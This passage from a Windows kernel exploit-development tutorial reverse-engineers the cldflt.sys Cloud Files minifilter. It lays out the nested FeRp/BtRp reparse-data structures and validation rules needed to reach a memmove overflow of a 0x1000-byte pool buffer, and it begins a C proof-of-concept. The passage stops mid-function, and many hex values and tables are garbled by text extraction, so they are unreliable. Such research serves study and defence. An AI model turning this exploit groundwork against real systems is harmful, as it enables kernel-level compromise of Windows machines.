![](https://exploitreversing.com/wp-content/uploads/2026/02/images/0ac8d2ba116b699a991de90347331e7a8a4586f07af5f8e989e20709c0cd2106.jpg)

\[Figure 85\]: SYNCROOT\_REGISTRATION program and fltmc execution

The syncroot has been registered and a volume has been attached to the cldflt.sys minifilter driver.

The next step is only create a new file in the MySyncRoot folder:

[https://exploitreversing.com](https://exploitreversing.com/)

#include <windows.h>

#include <shlobj.h>

#include <stdio.h>

int main(void)

{ PWSTR appDataPath $=$ NULL; HRESULT hr $=$ SHGetKnownFolderPath(FOLDERID\_RoamingAppData, 0, NULL, &appDataPath); if (FAILED(hr)) { wprintf(L"Failed to resolve %%APPDATA%%. HRESULT: $\\odot \\times { } \_ { \\prime 0 } ^ { 0 \\prime } \\odot \\phantom { } \\otimes X$ \\n", hr); return -1; } wchar\_t folderPath\[MAX\_PATH\]; swprintf(folderPath, MAX\_PATH, L"%s\\MySyncRoot", appDataPath); CreateDirectoryW(folderPath, NULL); wchar\_t filePath\[MAX\_PATH\]; swprintf(filePath, MAX\_PATH, L"%s\\ers06.txt", folderPath); HANDLE hFile $=$ CreateFileW( filePath, GENERIC\_WRITE, 0, NULL, CREATE\_ALWAYS, FILE\_ATTRIBUTE\_NORMAL, NULL ); if (hFile $= =$ INVALID\_HANDLE\_VALUE) { wprintf(L"Failed to create file: %s (Error %lu)\\n", filePath, GetLastError()); CoTaskMemFree(appDataPath); return -1; } const char\* text $=$ "Exploit Reversing Series \| ERS 06!\\r\\n"; DWORD written $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; if (!WriteFile(hFile, text, (DWORD)strlen(text), &written, NULL)) { wprintf(L"Failed to write to file. Error %lu\\n", GetLastError()); CloseHandle(hFile); CoTaskMemFree(appDataPath); return -1; } CloseHandle(hFile); wprintf(L"File created successfully: %s\\n", filePath); CoTaskMemFree(appDataPath); return 0;

} \[Figure 86\]: SYNCROOT\_OPERATIONS program

Obviously, the code is simple enough and only creates a single file on our registered syncroot to populate it with some file:

[https://exploitreversing.com](https://exploitreversing.com/)

C:\\Users\\Administrator\\Desktop\\RESEARCH>SYNCROOT\_OPERATIONS.exe

File created successfully: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06.txt

To the next task the challenge is considerably harder, and we need to write a program that creates a reparse point, and this is only possible if the code respects all restrictions imposed by the mini-filter driver and that we discussed previously.

From HsmpCtxCreateStreamContext routine (FeRp object), only five (00 to 04) elements are necessary for our program (but we cannot forget that the function checks for 10 elements, from 00 to 09), and we know that four of them have type restrictions:

▪ Element 01: HSM\_ELEMENT\_TYPE\_UINT32 $\\left\[ \\odot \\times \\odot \\right\]$ ▪ Element 02: HSM\_ELEMENT\_TYPE\_UINT64 ▪ Element 03: HSM\_ELEMENT\_TYPE\_BITMAP ▪ Element 04: HSM\_ELEMENT\_TYPE\_BITMAP $( \\Theta \\times \\bot \\bot )$

The HsmpRpValidateBuffer routine (FeRp object) enforces the following type restrictions:

▪ Element 00: HSM\_ELEMENT\_TYPE\_BYTE $( \\odot \\times \\odot 7 )$

Element 01: HSM\_ELEMENT\_TYPE\_UINT32 $\\left( \\odot \\times \\odot \\right)$

▪ Element 02: HSM\_ELEMENT\_TYPE\_UINT64 $\\left( \\odot \\times \\odot 6 \\right)$

▪ Element 04: HSM\_ELEMENT\_TYPE\_BITMAP $\\left( \\Theta \\times \\perp 1 \\right)$

▪ Element 05: HSM\_ELEMENT\_TYPE\_BITMAP $\\left( \\Theta \\times \\perp 1 \\right)$

▪ Element 06: HSM\_ELEMENT\_TYPE\_BITMAP $( \\Theta \\times \\bot \\bot )$

# The HsmpBitmapIsReparseBufferSupported routine (BtRp object) enforces the following type restrictions:

▪ Element 00: HSM\_ELEMENT\_TYPE\_BYTE $\\left( \\odot \\times \\odot 7 \\right)$

▪ Element 01: HSM\_ELEMENT\_TYPE\_BYTE $\\left( \\odot \\times \\odot 7 \\right)$

Element 02: HSM\_ELEMENT\_TYPE\_BYTE $\\left( \\odot \\times \\odot 7 \\right)$

Finally, HsmIBitmapNORMALOpen routine (BtRp object) imposes the following type restrictions:

▪ Element 01: HSM\_ELEMENT\_TYPE\_BYTE $( \\Theta \\times \\Theta 7 )$

▪ Element 02: HSM\_ELEMENT\_TYPE\_BYTE $\\left( \\odot \\times \\odot 7 \\right)$

▪ Element 03: HSM\_ELEMENT\_TYPE\_UINT64 $\\left( \\odot \\times \\odot 6 \\right)$

Element 04: HSM\_ELEMENT\_TYPE\_BITMAP $( \\Theta \\times \\bot 1 )$

There are numerous details that should be regarded as important aspects of the problem. First, we should recall the order and hierarchy of routine calls:

HsmFltPostQUERY\_OPEN HsmFltPostECPCreate HsmpSetupContexts

# HsmpCtxCreateStreamContext

Checks FeRp elements 01, 02, 03 and 04 before calling HsmIBitmapNORMALOpen for the first time. There is a restriction, and Element\_03 must be HSM\_ELEMENT\_TYPE\_BITMAP. ▪ Actually, this routine tests for all 10 FeRp elements (00 to 09)

HsmpRpValidateBuffer:

Checks FeRp elements 00, 01, 02 and 04 before calling HsmpBitmapIsReparseBufferSupported.

# [https://exploitreversing.com](https://exploitreversing.com/)

▪ The magic value of the object is verified to be sure that it is FpRp.

▪ The CRC32 is also verified of the data buffer is also verified. After calling HsmpBitmapIsReparseBufferSupported, FeRp elements 05 and 06 are also checked. However, for us, we are only concerned about elements before the routine invocation.

HsmpBitmapIsReparseBufferSupported:

▪ It is called to element 04 (HSM\_ELEMENT\_TYPE\_BITMAP).

▪ The element must have a magic value equal to BtRp, which is compatible with bitmaps.

▪ Checks BtRp elements 0, 1 and 2, which are sub-elements of element 04.

▪ Actually, this routine is prepared for 5 BtRp elements (00 to 04).

# HsmIBitmapNORMALOpen:

Checks BtRp elements 01, 02, 03 and 04. It is routine where the bug and vulnerability occur due to memmove(ptr\_buffer\_02, Src, Element\_Length) line. The ptr\_buffer\_02 has size of 0x1000 bytes.

▪ Both Src and Element\_Length are controlled.

▪ Element\_Length comes from Element 04’s length, which we also control.

Based on the sequence of routine calls and code presented previously, we reach other conclusions:

▪ There is one reparse point, but it is composed of two sets (data buffers) of elements such as FeRp object and BtRp object, which the second object (BtRp) is nested under the first one (FeRp).

▪ In the first two critical routines (HsmpCtxCreateStreamContext and HsmpRpValidateBuffer), the code manages the same elements, and we must fit them according to type restrictions already mentioned above.

▪ In HsmpCtxCreateStreamContext routine, there is not any restriction for the element 00. Nonetheless, it requires attention because other routines may, and in fact will, impose restrictions on this same element.

▪ In the second routine (HsmpRpValidateBuffer), element 03 is not mentioned and, at the same way, it does not mean that other routines will not enforce restriction on it (as actually will occur).

▪ The third routine (HsmpBitmapIsReparseBufferSupported) only applies and process elements whose type is HSM\_ELEMENT\_TYPE\_BITMAP (BtRp).

▪ The fourth routine (HsmIBitmapNORMALOpen) tests the second set of elements, which are nested inside of element 04 from FeRp reparse object, but it does not offer any mention about element 00, and same previous observations are valid.

In similar scenarios, where there are multiple constraints and conditions, and which consider nested elements within a single element, understanding what is really happening is far from easy. The first step is getting an overview of how \_REPARSE\_DATA\_BUFFER\_EX, \_REPARSE\_DATA\_BUFFER, \_HSM\_REPARSE\_DATA, \_HSM\_DATA and \_HSM\_ELEMENT\_INFO structures are organized:

REPARSE\_DATA\_BUFFER\_EX - $+ \\odot \\times \\odot \\odot$ ULONG ReparseTag - $+ \\odot \\times \\odot 4$ USHORT ReparseDataLength - $+ \\odot \\times \\odot 6$ USHORT Reserved - $+ \\odot \\times \\odot 8$ UCHAR DataBuffer\[\] - \_HSM\_REPARSE\_DATA - $+ \\odot \\times \\odot \\odot$ USHORT Flags - $+ \\odot \\times \\odot 2$ USHORT Length - $+ \\odot \\times \\odot 4$ \_HSM\_DATA - $+ \\odot \\times \\odot \\odot$ ULONG Magic - $+ \\odot \\times \\odot 4$ ULONG Crc32 - $+ \\odot \\times \\odot 8$ ULONG Length - $+ \\Theta \\times \\Theta \ C$ USHORT Flags - $+ \\odot \\times \\odot \\mathsf E$ USHORT NumberOfElements - $+ \\odot \\times \\perp \\odot$ HSM\_ELEMENT\_INFO Elements\[NumberOfElements\] - Element\[0\] - $+ \\odot \\times \\odot \\odot$ Type - $+ \\odot \\times \\odot 2$ Flags - $+ \\odot \\times \\odot 4$ Offset - $+ \\odot \\times \\odot 8$ Length - Element\[1\] - same layout as Element\[0\] - Element\[N-1\] - same layout as Element\[0\] - $+ ? ?$ Payload bytes referenced by each element

A breakout illustrating type restrictions, conditions and nested elements can helps readers to understand the big picture, and certainly will help you to write proof-of-concepts and exploit later:

HSM\_REPARSE\_DATA - Flags - Length - HSM\_DATA (FeRp object, Magic $=$ 'FeRp') Magic $=$ 'FeRp' Crc32 dwordLen $=$ StructSize - 4 Flags = $\\Theta \\times \\Theta \\Theta \\Theta 2$ MaxElements $\\qquad = \\quad \\perp \\Theta$ - HSM\_ELEMENT\_INFO\[10\] (each $= \ 8$ bytes) - Descriptor table $( \\Theta \\times \\mathtt { l } \\odot \ \ \\Theta \\times \\mathtt { U } \\vdash )$ ): $\\Theta \\times \\bot \\Theta$ Element\[0\] BYTE (used) $\\Theta \\times \\bot 8$ Element\[1\] UINT32 (used) $\\Theta \\times 2 \\Theta$ Element\[2\] UINT64 (used) $\\Theta \\times 2 8$ Element\[3\] BITMAP (used) $\\Theta \\times 3 \\Theta$ Element\[4\] BITMAP (used) -- Elements 5–9 exist structurally but are unused -- $\\Theta \\times 3 8$ Element\[5\] BITMAP (unused) $\\Theta \\times 4 \\Theta$ Element\[6\] BITMAP (unused) $\\Theta \\times 4 8$ Element\[7\] UINT64 (unused) $\\Theta \\times 5 \\Theta$ Element\[8\] UINT64 (unused) $\\Theta \\times 5 8$ Element\[9\] UINT32 (unused)

- Payload region (begins at $\\Theta \\times 6 \\Theta$ ) $\\Theta \\times 6 \\Theta$ \[Element 0\] BYTE $\\Theta \\times 6 4$ \[Element 1\] UINT32 $\\Theta \\times 6 8$ \[Element 2\] UINT64 $\\Theta \\times 6 \ C$ \[Element 3\] BITMAP (4 bytes) $\\Theta \\times 7 8$ \[Element 4\] Nested BtRp blob - Alignment: FeRp StructSize rounded up to next 8-byte boundary

# Nested BtRp object (FeRp Element\[4\])

- HSM\_DATA (BtRp object, Magic $=$ 'BtRp')

- Version $=$ $\\Theta \\times \\Theta \\Theta \\Theta 1$

- StructSize $=$ totalSize (low 16 bits)

- Magic $=$ HSM\_BITMAP\_MAGIC ('BtRp')

- Crc32

- Length $=$ maximal + 4

- Flags $=$ $\\Theta \\times \\Theta \\Theta \\Theta 2$

- NumberOfElements = 5

- HSM\_ELEMENT\_INFO\[5\] (each info $= \ 8$ bytes)

- Element\[0\] BYTE $\\left( \\cdot \\right) \\times \\left( \\cdot \\right) \\cdot$ ), Length $= ~ 1$ , Offset = 0x60 - Element\[1\] BYTE $\\left( \\odot \\times \\odot 7 \\right)$ , Length $= ~ 1$ , Offset = $\\Theta \\times 6 4$ - Element\[2\] BYTE $( \\cdot ) \\times \\Theta 7 )$ ), Length $= ~ 1$ , Offset = $\\Theta \\times 6 8$ - Element\[3\] UINT64 ( $( \\Theta \\times \\Theta \ C ) ,$ ), Length $= \ 8$ , Offset = $\\Theta \\times 6 \ C$ - Element\[4\] BITMAP ( $( \\Theta \\times \\bot 1$ ), Length $= ~ 5 2 8$ , Offset = $\\Theta \\times 7 8$ - Element data region (inner BtRp)


\[BYTE data\] @ $\\Theta \\times 6 \\Theta$

\[BYTE data\] @ $\\Theta \\times 6 4$

\[BYTE data\] @ $\\Theta \\times 6 8$

\[UINT64 data\] @ $\\Theta \\times 6 \ C$

\[BITMAP payload\] @ $\\Theta \\times 7 8$

Alignment: BtRp total size rounded UP to next 4-byte boundary

Both parts of the diagram above can be better explained by analyzing details below:

FeRp Buffer Layout

|     |     |     |
| --- | --- | --- |
| Offset | Size 2 | Field |
| 0x00 0x02 | Version (0x0001) StructSize (filled at end) |
| 2 4 |  |
| 0x04 0x08 | Magic = HSM\_FILE\_MAGIC ("FeRp") |
| 4 0x0C 4 | CRC32 (Calculate\_CRC32 over \[0x0C .. StructSize-1\]) dwordLen = position\_limit - 4 |
| 0x10 | FlagS = HSM\_DATA\_HAVE\_CRC (0x0002) |
| 0x12 | 2 2 MaxElements = 0x000A (10) |
| 0x14 8×10 | HSM\_ELEMENT\_INFO descriptors (Type, Length, Offset) |
|  | (10 descriptors, each 8 bytes → 0x14..0x5F) |
|  | Element\[0\] → BYTE (0x07), Length = 1, Offset = 0x60 |
|  | Element\[1\] (0x0A), Length = 4, Offset = 0x64 |
|  | → UINT32 Element\[2\] → UINT64 (0x06), Length = 8, Offset = 0x68 |

Element\[3\] BITMAP (0x11), Length $= 4$ , Offset = 0x6C

Element\[4\] BITMAP $\\Theta { \\bf { x } } \\bf { 1 } { 1 } )$ , Length $=$ BtRpSize, Offset = 0x78

\-\- Elements 5–9 exist structurally but are unused by the program --

Element\[5\] BITMAP $\\Theta { \\bf { x } } \\bf { 1 } { 1 } )$ , Length $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$ , Offset $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$

Element\[6\] BITMAP (0x11), Length $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$ , Offset $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$

Element\[7\] UINT64 (0x06), Length $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$ , Offset $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$

Element\[8\] UINT64 (0x06), Length $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$ , Offset $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$

Element\[9\] UINT32 $( \\Theta \\times \\Theta \\mathsf { A } )$ , Length $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$ , Offset $\\mathbf { \\Omega } = \\mathbf { \\Omega } \\Theta$

Payload region begins at 0x60

Element\[0\] BYTE $\\pmb { \\mathbb { Q } }$ 0x60

Element\[1\] UINT32 $\\textcircled { \\textsf { \\textsf { Q } } } \ \\Theta \\times 6 4$

Element\[2\] UINT64 $\\textcircled { \\textsf { d } } \ \\Theta \\times 6 8$

Element\[3\] BITMAP(4B) $\\begin{array} { l l } { \\varnothing } & { \\Theta \\times 6 \\mathsf { C } } \\end{array}$

Element\[4\] BtRp blob @ 0x78

Padding next 8‑byte boundary

(FeRp StructSize aligned to 8 bytes)

BtRp Buffer Layout

Offset Size Field

0x00 2 Version (0x0001)

0x02 2 StructSize (low 16 bits of total size)

0x04 4 Magic $=$ HSM\_BITMAP\_MAGIC ("BtRp")

0x08 4 CRC32 (Calculate\_CRC32 over \[0x0C .. (Length-1)\])

0x0C 2 Length $=$ max\_offset + 4

0x0E 2 Flags $=$ HSM\_DATA\_HAVE\_CRC $\\Theta \\times \\Theta \\Theta \\Theta 2 )$

0x10 2 NumberOfElements $=$ 5

0x12 2 Padding / reserved

0x14 8×5 HSM\_ELEMENT\_INFO descriptors (Type, Length, Offset) Element\[0\] BYTE $( \\Theta \\times \\Theta 7 )$ , Length $\\mathit { \\Theta } = \\mathit { \\Theta } \\mathtt { 1 }$ , Offset = 0x60 Element\[1\] BYTE (0x07), Length $\\mathit { \\Theta } = \\mathit { \\Theta } \\mathtt { 1 }$ , Offset = 0x64 Element\[2\] BYTE (0x07), Length $\\mathit { \\Theta } = \\mathit { \\Theta } \\mathtt { 1 }$ , Offset $\\mathbf { \\xi } = \\mathbf { \\beta } \\Theta \\mathbf { x } 6 8$ Element\[3\] UINT64 (0x06), Length $= 8 .$ Offset = 0x6C Element\[4\] BITMAP (0x11), Length $=$ 528, Offset = 0x78 Payload region begins at $\\Theta \\times 6 \\Theta$ Element\[0\] BYTE @ 0x60 Element\[1\] BYTE @ 0x64 Element\[2\] BYTE $\\textcircled { \\textsf { d } } \ \\Theta \\times 6 8$ Element\[3\] UINT64 @ 0x6C Element\[4\] BITMAP blob @ 0x78 Padding next $\\pmb { 4 }$ ‑byte boundary (BtRp aligns each element offset to 4 bytes)

In terms of lengths and sizes, we have the following details:

# 01\. FeRp (HSM\_FILE\_MAGIC, outer object)

Element descriptors (format requirement): 10 (elements) $\\times ~ 8$ bytes $\ = \\otimes \\Theta$ bytes (Program uses only 5 elements, but the FeRp wire format always reserves 10 slots)

Payloads (program‑used elements only):

▪ Element\[0\] BYTE $ ~ 1$ byte

\] Element\[1\] UINT32 $ 4$ bytes Element\[2\] UINT64 $ 8$ bytes Element\[3\] BITMAP $ 4$ bytes Element\[4\] BITMAP size of nested BtRp (BtRp\_data)

Raw payload sum:

FeRp\_payload\_raw $= ( 1 + 4 + 8 + 4 + 8 t \\mathsf { R }$ p\_data)

Total raw FeRp size: FeRp\_data\_raw = 80 + FeRp\_payload\_raw $= 8 \\Theta + \\left( 1 + 4 + 8 + 4 + 8 \\pm \\mathsf { R e p \_ d a t a } \\right)$

Alignment:

FeRp\_data $=$ round\_up\_to\_next\_8\_bytes(FeRp\_data\_raw)

Stored fields:

\_HSM\_DATA.Length(FeRp) @ +0x0C = FeRp\_data − 4 StructSize @ $+ \\Theta { \\tt x } \\Theta 2 { \\mathrm { ~ = ~ } }$ FeRp\_data CRC covers bytes \[ $\\Theta \\times \\Theta \\mathsf { C }$ .. FeRp\_data), length $=$ FeRp\_data − 12\
\
Example (using a BtRp size ≈ $\\Theta \\times 2 8 \\mathsf { C } \\mathrm { ~ = ~ } 6 5 2 )$ : FeRp\_data\_raw $= ~ 8 \\Theta ~ + ~ ( 1 ~ + ~ 4 ~ + ~ 8 ~ + ~ 4 ~ + ~ 6 5 2 )$ $= 8 0 + 6 6 9$ = 749 FeRp\_data $=$ round\_up\_8(749) = 752 (0x2F0) \_HSM\_DATA.Length(Fe $\\mathsf { R p } ) \ = \ 7 5 2 \ - \ 4 \ = \ 7 4 8 \ ( \\Theta { \\times } 2 \\mathsf { E C } )$ StructSize $=$ 752 ( $\\Theta \\times 2 F \\Theta )$\
\
# 02\. BtRp (HSM\_BITMAP\_MAGIC, nested object)\
\
Element descriptors: $5 \\times 8$ bytes $= ~ 4 \\Theta$ bytes\
\
Element data region:\
\
Element\[0\] BYTE $ ~ 1$ byte\
\
Element\[1\] BYTE $ ~ 1$ byte\
\
Element\[2\] BYTE $ ~ 1$ byte\
\
Element\[3\] UINT64 $ 8$ bytes\
\
Element\[4\] BITMAP $ \\mathsf { N }$ bytes (payload placeholder)\
\
Raw payload sum: BtRp\_data\_raw $= 4 \\Theta + { \\left( 1 \ + \ 1 \ + \ 1 \ + \ 8 \ + \ \ N \\right) }$\
\
Alignment:\
\
BtRp\_data $=$ round\_up\_to\_next\_4\_bytes(BtRp\_data\_raw)\
\
Stored fields:\
\
• \_HSM\_DATA.Length(BtRp) $=$ BtRp\_data\
\
• StructSize @ $\\mid \\mathbf { \\varphi } + \\Theta \\mathbf { \\times } \\Theta 2 \ =$ BtRp\_data\
\
• CRC covers bytes $\\mathsf { \\partial } \_ { \\mathsf { \\partial } } \\mathsf { \\partial } \_ { \\mathsf { \\partial } } \\Theta \\mathsf { C }$ .. BtRp\_data), length $=$ BtRp\_data − 8\
\
Example (in my case $N = 5 2 8 )$ : BtRp\_data\_raw $= 4 0 + ( 1 + 1 + 1 + 8 + 5 2 8 )$ $= 5 7 9$ BtRp\_data $=$ round\_up\_4(579) = 580 (0x244) \_HSM\_DATA.Length(BtRp) $=$ 580 (0x244)\
\
\[Figure 90\]: Reparse Data Breakout\
\
To the step phase, I have written a program named reparse\_point, which creates a reparse point and also respects all restrictions demonstrated so far. For now, I am interested in creating the structure of nested objects (FeRp and BtRp) and also reaching the same routine and code region where the vulnerability is located, hence the program uses a limited length (0x200 bytes) to element 04 from BtRp object, thereby being submitted to the conditional checking and at the same time controlling the exact amount of data copied by memmove (memcpy) instruction. As it is smaller than the critical limit (0x1000), it will not hurt anything at this moment. It is essential to emphasize that this program does not reach the vulnerable line of code yet (it executes the “good memmove” and also is accepted by the “if statement” block below) but provides us with enough information on how the cldflt.sys minifilter driver processes the reparse point. If you do not remember, the critical lines are the following:\
\
p\_buffer\_dest $=$ ExAllocatePoolWithTag(PagedPool, 0x1000uLL, 'mBsH'); \*((\_QWORD \*)ptr\_buffer\_01 + 7) $=$ p\_buffer\_dest; if ( p\_buffer\_dest ) { memmove(p\_buffer\_dest, Src, Element\_Length); if ( Element\_Length < 0xFFC ) { index $=$ ((4091 - Element\_Length) >> 2) $^ + 1$ ; do { \*(\_DWORD \*)(Length\_Element\_04\_02 $^ +$ \*((\_QWORD $\\star$ )ptr\_buffer\_01 + 7)) = v43; Length\_Element\_04\_02 $+ =$ 4LL; --index; } while ( index ); } \*(\_DWORD \*)(\*((\_QWORD \*)ptr\_buffer\_01 + 7) $^ +$ 4092LL) $=$ RtlComputeCrc32(0, \*((PUCHAR \*)ptr\_buffer\_01 + 7), $\\Theta \\times \\mathsf { F F C U } .$ ); goto LABEL\_109; } status $=$ STATUS\_INSUFFICIENT\_RESOURCES; HsmDbgBreakOnStatus(STATUS\_INSUFFICIENT\_RESOURCES); } ptr\_buffer\_02 $=$ ExAllocatePoolWithTag(PagedPool, 0x1000uLL, 'mBsH');\
\
\*((\_QWORD $\\star$ )ptr\_buffer\_01 + 7) $=$ ptr\_buffer\_02;\
\
if ( ptr\_buffer\_02 )\
\
{ memmove(ptr\_buffer\_02, Src, Element\_Length);\
\
Based on my personal experience, I always consider this stage of exploit development one of most critical and sometimes challenging phases because there are targets (like this one) that impose a series of restrictions, file formatting, conditions, and other rules that need and must be considered, which can make the task of writing a code to reach the vulnerable line much harder than usual. The following code has been compiled using Visual Studio 2022, with configuration in Release mode, without any other special setting in the project or solution properties:\
\
#include <winioctl.h> #include <ShlObj.h> #include <stdio.h> #include  #include <initguid.h> #include <guiddef.h>\
\
DEFINE\_GUID(ProviderId, $\\Theta \\times$ 1b4f2a33, $\\Theta \\times$ b1b3, $\\Theta \\times 4 \\Theta \\subset \\Theta$ , $\\Theta \\times \\mathsf { b a }$ , $\\Theta \\times 5 \ a$ , $\\Theta \\times \\Theta 6$ , $\\Theta \\times 3 4$ , $\\Theta \\times \\in \\mathsf { C }$ , $\\Theta \\times 6 3$ , $\\Theta \\times \\mathrm { d e }$ , $\\Theta \\times \\Theta \\Theta$ );\
\
#pragma comment(lib, "Cldapi.lib")\
\
typedef enum \_HSM\_CONSTANTS { HSM\_BITMAP\_MAGIC $=$ 0x70527442, // 'BtRp' HSM\_FILE\_MAGIC $=$ $\\Theta \\times 7 \\Theta 5 2 6 5 4 6$ , // 'FeRp' HSM\_DATA\_HAVE\_CRC $=$ $\\Theta \\times \\Theta 2$ , HSM\_ELEMENT\_TYPE\_UINT64 $=$ $\\Theta \\times \\Theta 6$ , HSM\_ELEMENT\_TYPE\_BYTE $=$ $\\Theta \\times \\Theta 7$ , HSM\_ELEMENT\_TYPE\_UINT32 $=$ $\\Theta \\times \\Theta \\mathsf { A }$ , HSM\_ELEMENT\_TYPE\_MAX = 0x10, HSM\_ELEMENT\_TYPE\_BITMAP $=$ $\\Theta \\times \\bot 1$ ,\
\
} HSM\_CONSTANTS; static const USHORT HSM\_HEADER\_SIZE $=$ $\\Theta \\times \\perp 4$ ;\
\
static const USHORT HSM\_ELEMENT\_INFO\_SIZE $=$ $\\Theta \\times \\Theta 8$ ;\
\
static const USHORT BTRP\_ALIGN $=$ $\\Theta \\times \\Theta 4$ ;\
\
static const USHORT FERP\_ALIGN $=$ $\\Theta \\times \\Theta 8$ ;\
\
static const USHORT FERP\_BUFFER\_SIZE $=$ $\\Theta \\times 1 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT BTRP\_BUFFER\_SIZE $=$ $\\Theta \\times 1 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT COMPRESSED\_SIZE $=$ $\\Theta \\times 1 \\Theta \\Theta \\Theta$ ;\
\
static const USHORT REPARSE\_DATA\_SIZE $=$ $= 0 \\times 1 0 0 0$ ;\
\
static const USHORT ELEMENT\_SIZE $=$ $= 0 \\times 1 0 0 0$ ;\
\
static const USHORT ELEMENT\_NUMBER $\\begin{array} { r l } { = } & { { } \\odot \\times \\odot 5 } \\end{array}$ ; // Remember: program uses 5 elements static const USHORT MAX\_ELEMS $=$ $\\Theta \\times \\Theta \\mathsf { A }$ ; // Remember: FeRp format reserves 10 slots static const USHORT VERSION\_VALUE $=$ $\\Theta \\times \\Theta \\Theta \\Theta 1$ ;\
\
static const USHORT ELEMENT\_START\_OFFSET $=$ $\\Theta \\times 6 \\Theta$ ; // That's where the payload actually starts (consider 10 slots)\
\
static const USHORT PAYLOAD\_OFFSET $= ~ \\odot \\times 2 \\odot \\odot$ ;\
\
static const USHORT PAYLOAD\_SIZE $=$ $\\Theta \\times 2 1 \\Theta$ ;\
\
static const USHORT PAYLOAD\_INITIAL\_BYTE $=$ $\\Theta \\times \\mathsf { A B }$ ; // This value can be aleatory, and in this case, I have used initials of my name.\
\
#pragma pack(push, 1)\
\
typedef struct \_HSM\_ELEMENT\_INFO {\
\
USHORT Type;\
\
USHORT Length;\
\
ULONG Offset;\
\
} HSM\_ELEMENT\_INFO, $\\star$ PHSM\_ELEMENT\_INFO;\
\
// Note: For FeRp, we must prepend Version $^ +$ StructSize at offsets $\\Theta \\times \\odot \\Theta - \\odot \\times \\odot 3$ ,\
\
// and then this HSM\_DATA content starts at $+ \\odot \\times \\odot 4$ in the buffer we build.\
\
typedef struct \_HSM\_DATA {\
\
ULONG Magic;\
\
ULONG Crc32;\
\
USHORT NumberOfElements; HSM\_ELEMENT\_INFO ElementInfos\[\]; } HSM\_DATA, $\\star$ PHSM\_DATA; typedef struct \_HSM\_REPARSE\_DATA { USHORT Flags; USHORT Length; HSM\_DATA FileData; } HSM\_REPARSE\_DATA, $\\star$ PHSM\_REPARSE\_DATA; typedef struct \_REPARSE\_DATA\_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; struct { UCHAR DataBuffer\[FERP\_BUFFER\_SIZE\]; } GenericReparseBuffer; } REPARSE\_DATA\_BUFFER, $\\star$ PREPARSE\_DATA\_BUFFER; typedef struct \_REPARSE\_DATA\_BUFFER\_EX { ULONG Flags; ULONG ExistingReparseTag; GUID ExistingReparseGuid; ULONGLONG Reserved; REPARSE\_DATA\_BUFFER ReparseDataBuffer; } REPARSE\_DATA\_BUFFER\_EX, $\\star$ PREPARSE\_DATA\_BUFFER\_EX; #pragma pack(pop) typedef enum \_HSM\_ELEMENT\_OFFSETS { ELEM\_TYPE $=$ $\\Theta \\times \\Theta \\Theta$ , ELEM\_LENGTH $\\begin{array} { r l } { = } & { { } \\odot \\times \\odot 2 } \\end{array}$ , ELEM\_OFFSET $=$ $\\Theta \\times \\Theta 4$ , } HSM\_ELEMENT\_OFFSETS; typedef enum \_HSM\_DATA\_OFFSETS { DATA\_MAGIC $=$ $\\Theta \\times \\Theta \\Theta$ , DATA\_CRC32 $=$ $\\Theta \\times \\Theta 4$ , DATA\_LENGHT $=$ $\\Theta \\times \\Theta 8$ , DATA\_FLAGS $=$ $\\Theta \\times \\Theta \ C$ , DATA\_NR\_ELEMS $=$ $\\Theta \\times \\Theta \\mathsf { E }$ , } HSM\_DATA\_OFFSETS; typedef enum \_HSM\_FERP\_OFFSETS { FERP\_VERSION $=$ $\\Theta \\times \\Theta \\Theta$ , FERP\_STRUCT\_SIZE $=$ $\\Theta \\times \\Theta 2$ , FERP\_MAGIC $=$ $\\Theta \\times \\Theta 4$ , FERP\_CRC $=$ $\\Theta \\times \\Theta 8$ , FERP\_LENGTH $=$ $\\Theta \\times \\Theta \ C$ , // (StructSize - 4) FERP\_FLAGS $=$ $\\Theta \\times \\bot \\Theta$ , FERP\_MAX\_ELEMS $=$ $\\Theta \\times 1 2$ } HSM\_FERP\_OFFSETS;\
\
[https://exploitreversing.com](https://exploitreversing.com/)\
\
typedef enum \_HSM\_BTRP\_OFFSETS { BTRP\_MAGIC $=$ $\\Theta \\times \\Theta 4$ , BTRP\_CRC $=$ $\\Theta \\times \\Theta 8$ , BTRP\_LENGTH $=$ $\\Theta \\times \\Theta \ C$ , BTRP\_FLAGS $=$ $\\Theta \\times \\bot \\Theta$ , BTRP\_MAX\_ELEMS $=$ $\\Theta \\times 1 2$\
\
} HSM\_BTRP\_OFFSETS;\
\
static ULONG Calculate\_CRC32(ULONG seed, const void\* buf, size\_t len) { ULONG crc $=$ ~seed; const unsigned char\* p $=$ (const unsigned char\*)buf; for (size\_t i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ len; ++i) { crc $\\Lambda =$ p\[i\]; for (int j = 0; j < 8; ++j) { if (crc & 1) crc $=$ (crc >> 1) ^ $\\Theta \\times$ EDB88320; else crc $> > = ~ 1$ ; } } return ~crc;\
\
}\
\
static void ValidateBtRp(const char\* buffer\_btrp, int count, const HSM\_ELEMENT\_INFO\*\
\
